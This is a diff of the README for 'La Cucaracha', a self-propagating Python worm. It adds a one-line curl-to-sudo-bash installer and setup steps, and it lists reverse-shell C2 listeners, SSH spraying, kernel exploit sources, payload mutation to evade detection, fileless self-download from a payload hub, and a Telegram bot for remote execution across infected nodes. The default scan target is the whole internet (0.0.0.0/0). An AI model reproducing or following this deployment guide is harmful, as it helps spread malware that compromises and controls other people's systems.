@@ -10,6 +10,40 @@
 
 ---
 
+## 🚀 Quick Install
+
+```bash
+curl -sSL https://raw.githubusercontent.com/masterfrequency/LaCucaracha/main/install.sh | sudo bash
+```
+
+That installs everything to `/opt/la-cucaracha` (venv + deps + config template). Then:
+
+```bash
+sudo nano /opt/la-cucaracha/telegram_config.json   # bot token + chat id
+/opt/la-cucaracha/.venv/bin/python3 -u /opt/la-cucaracha/LaCucaracha.py --auto --telegram
+```
+
+Or use the wrapper: `/opt/la-cucaracha/scripts/la-cucaracha-start.sh`.
+
+**Manual (from a clone):**
+
+```bash
+git clone https://github.com/masterfrequency/LaCucaracha.git
+cd LaCucaracha
+python3 -m venv .venv && source .venv/bin/activate
+pip install -r requirements.txt
+cp telegram_config.example.json telegram_config.json   # then edit it
+python3 -u LaCucaracha.py --auto --telegram
+```
+
+Dependencies: `python3` (≥ 3.10) + `pip`. Optional extras: `nmap`/`masscan` for
+external scanner integration, TOR for the onion C2 channel.
+
+> 💡 Everything runs from the install directory — no hardcoded `/opt/hermes`
+> paths. Set `C2_HOST` in `telegram_config.json` (or `127.0.0.1` for single-box lab).
+
+---
+
 ## 📦 What It Is
 
 La Cucaracha is a fully autonomous, self-propagating worm written as a monolithic Python 3 engine.
@@ -35,10 +69,23 @@ The main engine is one file: `LaCucaracha.py` (~700 KB, 15,823 lines).
 | `c2_listener_10001.py` | 347 | C2 listener (reverse shells, heel protocols) |
 | `payload_server_10004.py` | 175 | Token-gated payload hub server |
 | `integrator.py` | 141 | Wires RedLinux modules into the worm pipeline |
+| `c2_implant_server.py` | 340 | Token-gated implant/payload download server |
+| `feed_lacucaracha.py` | 71 | Intel feed ingestion |
 
-Supporting artifacts: `exploits/` (copy_fail, dirtyfrag, heel binaries + dirtyfrag.c),
-`payloads/` (MegaLarva.py, beacons: busybox/dvr/shell/mini, fleet scripts, implant.py),
-`la_section_A..G.py` (worm split into concatenated sections).
+Satellites & support:
+
+| Path | Role |
+|---|---|
+| `phases/` | `discovery_engine.py`, `exploit_engine.py`, `deploy_intel_engine.py` |
+| `modules/` | `ghost_agent.py`, `neural_mesh.py`, `polymorph.py`, `ssh_spray.py`, `swarm_executor.py` |
+| `payloads/` | `MegaLarva.py`, `implant_v2.py`, `pathllib.py`, `worm_agent_light.py`, beacons (`busybox`/`dvr`/`shell`/`mini`), fleet scripts |
+| `exploits/` | `dirtyfrag.c` (source), `heel/` (Rust post-exploit agent source) |
+| `la_section_A..G.py` | Worm split into 7 concatenated sections |
+| `scripts/` | `la-cucaracha-start.sh`, `la_cucaracha_telegram.sh`, `la_cucaracha_v5_daemon.sh`, `restart_lacucaracha.sh` |
+| `config/` | `orchestrator_config.json` (Mistral/Telegram/API-key template) |
+| `install.sh` | One-liner installer (venv + deps + config) |
+| `requirements.txt` | Python dependencies |
+| `telegram_config.example.json` | Bot config template — copy to `telegram_config.json` |
 
 ---
 
@@ -193,7 +240,7 @@ web apps (3000/5000/8888/9200), DBs (3306/5432/27017/6379), then SMB/RDP/VNC/SSH
 `TCPPayloadMutationEngine` mutates payload bytes per target TCP fingerprint (`--adaptive-payload`)
 to evade signature detection. Deployment vectors: SSH push, HTTP drop, TFTP/wget/curl chains,
 self-replication via mesh. The worm pulls itself from the payload hub
-(`http://HUB:10004/LaCucaracha.py`) and runs filelessly.
+(`http://127.0.0.1:10004/LaCucaracha.py` — set `C2_HOST` in config) and runs filelessly.
 
 ---
 
@@ -206,7 +253,8 @@ self-replication via mesh. The worm pulls itself from the payload hub
 | `LaCucaracha_bot.py` | — | Telegram fleet command bot |
 
 Both servers validate a **rotating daily token** (date-derived, shared-secret HMAC) — requests
-without a valid token are rejected.
+without a valid token are rejected. Replace the placeholder `CHANGE_ME_PAYLOAD_KEY` in the
+servers with your own shared secret before deployment.
 
 ### 🤖 Telegram Bot — 29 Commands
 `start help status stats logs dashboard targets claim top whois ping scan exploit deploy mesh nodes
@@ -234,7 +282,7 @@ all nodes, remote exec, shutdown, and killswitch.
 --tg-token / --chat-id / --sweep-report
 --status / --stats  Engine statistics
 --clean             Reset all database data
---db                Database path (default: /opt/hermes/worm_mesh.db)
+--db                Database path (default: <install_dir>/worm_mesh.db)
 --subnet            Target subnet (default 0.0.0.0/0)
 --rate              Masscan packet rate (default 10000)
 --batch             Exploit batch size
